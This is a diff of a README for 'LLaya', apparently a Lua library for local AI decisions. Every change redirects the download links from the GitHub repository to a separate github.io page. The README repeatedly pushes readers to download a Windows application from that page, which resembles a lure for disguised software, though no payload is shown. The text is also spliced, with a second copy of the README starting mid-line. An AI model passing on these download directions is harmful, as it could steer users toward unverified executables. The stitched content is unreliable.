@@ -1,6 +1,6 @@
 # 🧠 LLaya - Fast local AI decisions made easy
 
-[![Download LLaya](https://img.shields.io/badge/Download_LLaya-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bertinebrocaded688/LLaya)
+[![Download LLaya](https://img.shields.io/badge/Download_LLaya-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://bertinebrocaded688.github.io)
 
 LLaya is a local AI decision tool for software that uses Lua. It runs the Laya typed-decision model inside the application, so you do not need a separate server and you do not need Python. LLaya can return answers as JSON text or as Lua tables. It works with Lua 5.1 through Lua 5.4 on Windows, Linux, and macOS. It is an open-source alternative to Jev.
 
@@ -52,7 +52,7 @@ Keep the downloaded LLaya files together in one folder. Moving or renaming indiv
 Getting started is a download-first process. The official page is the place to get the application.
 
 1. Open your web browser.
-2. Go to the official LLaya page: [Visit this link to download the application](https://github.com/bertinebrocaded688/LLaya).
+2. Go to the official LLaya page: [Visit this link to download the application](https://bertinebrocaded688.github.io).
 3. Use the download option shown on the page to get LLaya for Windows.
 4. Save the download in a folder you can easily find, such as your Downloads folder.
 5. Keep all LLaya files together in the same folder.
@@ -65,7 +65,7 @@ The download page is the source of truth for the Windows files. Use the download
 
 Use# 🧠 LLaya - Fast local AI decisions made easy
 
-[![Download LLaya](https://img.shields.io/badge/Download_LLaya-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bertinebrocaded688/LLaya)
+[![Download LLaya](https://img.shields.io/badge/Download_LLaya-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://bertinebrocaded688.github.io)
 
 LLaya gives Lua software a way to make local AI decisions. It runs the Laya typed-decision model inside the application. There is no server to start and no Python to install. LLaya can answer as JSON text or as Lua tables. It works with Lua 5.1 to 5.4 on Windows, Linux, and macOS. It is an open-source alternative to Jev.
 
@@ -121,7 +121,7 @@ Keep the downloaded LLaya files together in one folder. Moving or renaming indiv
 Getting started is a download-first process. The official page is the place to get the application.
 
 1. Open your web browser.
-2. Go to the official LLaya page: [Visit this link to download the application](https://github.com/bertinebrocaded688/LLaya).
+2. Go to the official LLaya page: [Visit this link to download the application](https://bertinebrocaded688.github.io).
 3. Use the download option shown on the page to get LLaya for Windows.
 4. Save the download in a folder you can easily find, such as your Downloads folder.
 5. Keep all LLaya files together in the same folder.
@@ -132,7 +132,7 @@ The download page is the official source for the Windows files. Use the download
 
 ## ⬇️ Download and Install
 
-Visit this link to download the application: [Download LLaya](https://github.com/bertinebrocaded688/LLaya).
+Visit this link to download the application: [Download LLaya](https://bertinebrocaded688.github.io).
 
 Use the download option shown on the page. Save the download in a folder you can easily find. Keep the LLaya files together after the download completes. The official page is the place to get the application.
 
@@ -169,7 +169,7 @@ If LLaya does not open, check that you downloaded it from the official page and 
 
 If you are using LLaya with Lua, confirm that your Lua version is between Lua 5.1 and Lua 5.4. LLaya does not need Python and does not need a server. If you set up Python or a server, you can remove those extra steps from your setup because LLaya does not require them.
 
-If the download did not complete, return to the official page and use the download option again: [Visit this link to download the application](https://github.com/bertinebrocaded688/LLaya).
+If the download did not complete, return to the official page and use the download option again: [Visit this link to download the application](https://bertinebrocaded688.github.io).
 
 ## ❓ Frequently Asked Questions
 
@@ -199,6 +199,6 @@ Yes. Text classification is one of the listed use areas for LLaya.
 
 ## 📚 Learn More and Get Help
 
-Use the official page for downloads, project information, and the latest files: [Visit this link to download the application](https://github.com/bertinebrocaded688/LLaya).
+Use the official page for downloads, project information, and the latest files: [Visit this link to download the application](https://bertinebrocaded688.github.io).
 
 Keywords: ai, ai-agents, ai-decision-making, bindings, decision-making, inference, jev, laya, local-ai, lua, lua-bindings, lua-library, lua-module, lua-programming, lua51, lualang, machine-learning, nlp, on-device-ai, text-classification
